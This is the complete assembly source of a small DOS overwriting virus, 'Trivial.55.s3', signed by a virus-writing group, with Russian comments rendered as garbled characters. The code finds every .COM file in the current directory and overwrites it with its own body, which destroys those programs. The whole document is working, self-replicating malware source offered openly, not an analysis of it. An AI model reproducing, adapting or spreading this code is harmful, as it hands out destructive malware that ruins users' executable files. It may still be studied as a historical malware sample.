   ; Trivial.55.s3 (c) by Duke/SMF
   ; Greetz to RedArc/TAVC
   ; *®à ¦ ¥â ¢á¥ *.COM ä ©«ë ¢ â¥ªãé¥© ¤¨à¥ªâ®à¨¨.

                   .model   tiny
                   .code
                   org     100h
   virus_length    equ     finish - start      ;„«¨  ¢¨àãá 

   start  :                                    ;* ç «® ¢¨àãá 
                   mov     ah,4Eh              ;*®¨áª ¯¥à¢®£® ä ©« 

                   ;‡ ¯¨å¨¢ ¥¬ ¢ DX ¬ áªã ä ©« 
                   ;*â ª¨©  â¨í¢à¨áâ¨ç¥áª¨© ¯à¨¥¬ :)
                   mov     di,ax
                   mov     dx,ax
                   mov     al,'*'
                   stosb
                   mov     al,'.'
                   stosb
                   mov     al,'c'
                   stosb
                   mov     al,'o'
                   stosb
                   mov     al,'m'
                   stosb
                   mov     al,0
                   stosb

   infect:
                   int     21h
                   jnc     infect_file         ;…á«¨ ä ©«  ©¤¥, â® ¯®à ¦ ¥¬,
                   ret                         ;¢ ¯à®â¨¢®¬ á«ãç ¥ ª®¥æ à ¡®âë.
   infect_file:
                   mov     ax,3D01h            ;Žâªàë¢ ¥¬ ä ©« ¤«ï § ¯¨á¨
                   mov     dx,9Eh              ;DX ãª §ë¢ ¥â    ©¤¥ë© ä ©«
                   int     21h

                   xchg    bx,ax               ;BX á®¤¥à¦¨â ä ©«®¢ë© handle

                   mov     ah,40h              ;”ãªæ¨ï § ¯¨á¨ ¢ ä ©«
                   mov     cl,virus_length     ;CL = áª®«ìª® ¡ ©â ¯¨á âì
                   mov     dx,offset start     ;DX =  ç «® ª®¤  ¢¨àãá 
                   int     21h

                   mov     ah,3Eh              ;‡ ªàë¢ ¥¬ ä ©«
                   int     21h

                   mov     ah,4Fh              ;*®¨áª á«¥¤ãîé¥£® ä ©« 
                   jmp     infect              ;*¥à¥å®¤   § à ¦¥¨¥

   finish  :                                   ;Š®¥æ ¢¨àãá 
                   end     start
